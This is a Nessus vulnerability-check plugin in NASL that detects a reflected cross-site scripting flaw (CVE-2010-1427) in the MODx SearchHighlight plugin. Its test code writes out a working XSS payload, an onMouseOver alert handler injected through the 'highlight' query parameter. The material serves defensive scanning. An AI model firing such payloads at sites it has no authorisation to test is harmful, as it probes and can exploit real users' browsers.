#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46183);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/01/14 03:46:11 $");

  script_cve_id("CVE-2010-1427");
  script_bugtraq_id(39310);
  script_osvdb_id(63596);
  script_xref(name:"Secunia", value:"39298");

  script_name(english:"MODx SearchHighlight plugin XSS");
  script_summary(english:"Attempts a cross-site scripting attack via the 'highlight' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is vulnerable to a
cross-site scripting attack.");

  script_set_attribute(attribute:"description", value:
"The version of MODx hosted on the remote web server fails to properly
sanitize user-supplied input to the 'highlight' parameter of the
'SearchHighlight' plugin.

An attacker, exploiting this flaw, could inject arbitrary HTML and
script code in a user's browser to be executed within the security
context of the affected site.

Note that the installed version of MODx is also potentially affected
by a SQL injection vulnerability, though Nessus has not tested for
this.");

  script_set_attribute(attribute:"see_also", value:"http://modxcms.com/forums/index.php/topic,47759.0.html");
  script_set_attribute(attribute:"see_also", value:"http://jvn.jp/en/jp/JVN46669729/index.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to MODx 1.0.3 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:modxcms:modxcms");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("modx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/modx");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'modx', port:port, exit_on_fail:TRUE);

data = SCRIPT_NAME + unixtime();
xss = ' onMouseOver="alert(\''+data+'\');"';

expected_output = '<div class="searchTerms">Search Terms: <span class=""'+xss+'">'+data+'</span>';
exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(install['dir']),
  cgi      : '/',
  qs       : 'searched='+data+'&advsearch=oneword&highlight="'+urlencode(str:xss),
  pass_str : expected_output,
  ctrl_re  : '<input type="hidden" name="advSearch" value="oneword" />'
);

if (!exploited)
{
  install_url = build_url(qs:install['dir'] + '/', port:port);
  exit(0, "The MODx install at " + install_url + " is not affected.");
}
